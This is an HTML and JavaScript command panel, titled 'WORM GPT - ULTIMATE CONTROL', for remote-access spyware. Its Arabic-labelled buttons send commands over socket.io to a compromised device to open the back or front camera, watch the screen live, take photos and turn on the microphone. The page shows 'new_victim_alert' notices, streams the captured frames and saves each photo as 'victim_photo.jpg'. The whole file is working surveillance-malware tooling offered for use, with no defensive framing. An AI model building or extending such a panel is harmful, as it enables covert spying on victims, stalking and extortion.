<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WORM GPT - ULTIMATE CONTROL</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
        .status { background: #111; padding: 10px; border-bottom: 2px solid #f00; color: #0f0; }
        #monitor { width: 95%; max-width: 1100px; height: 600px; border: 3px solid #f00; margin: 20px auto; background: #050505; display: flex; align-items: center; justify-content: center; }
        #liveImg { max-width: 100%; max-height: 100%; object-fit: contain; }
        .controls { background: #111; padding: 20px; position: fixed; bottom: 0; width: 100%; border-top: 2px solid #f00; }
        button { background: #f00; color: #000; border: none; padding: 12px 20px; margin: 5px; font-weight: bold; cursor: pointer; border-radius: 5px; }
        button:hover { background: #fff; color: #f00; }
    </style>
</head>
<body>
    <div class="status" id="stat">Waiting for target connection...</div>

    <div id="monitor">
        <img id="liveImg" src="" alt="[ FEED OFFLINE ]">
    </div>

    <div class="controls">
        <button onclick="send('start_camera_back')">الكاميرا الخلفية 📸</button>
        <button onclick="send('start_camera_front')">الكاميرا الأمامية 🤳</button>
        <button onclick="send('start_screen')">مشاهدة الشاشة مباشر 📱</button>
        <button onclick="send('take_photo')">التقاط صورة 🖼️</button>
        <button onclick="send('start_audio')">الميكروفون 🎙️</button>
        <button onclick="location.reload()">إيقاف / تحديث 🛑</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const imgView = document.getElementById('liveImg');

        socket.on('new_victim_alert', d => { document.getElementById('stat').innerText = "ONLINE: " + d.model; });

        // استقبال الفيديو (بث الكاميرا أو الشاشة)
        socket.on('display_frame', d => { imgView.src = "data:image/jpeg;base64," + d.frame; });

        // استقبال الصور الملتقطة وحفظها للجهاز
        socket.on('display_photo', d => {
            const b64 = "data:image/jpeg;base64," + d.img;
            imgView.src = b64;
            let link = document.createElement('a');
            link.href = b64;
            link.download = "victim_photo.jpg";
            link.click();
        });

        function send(cmd) { socket.emit('admin_command', { command: cmd }); }
    </script>
</body>
</html>
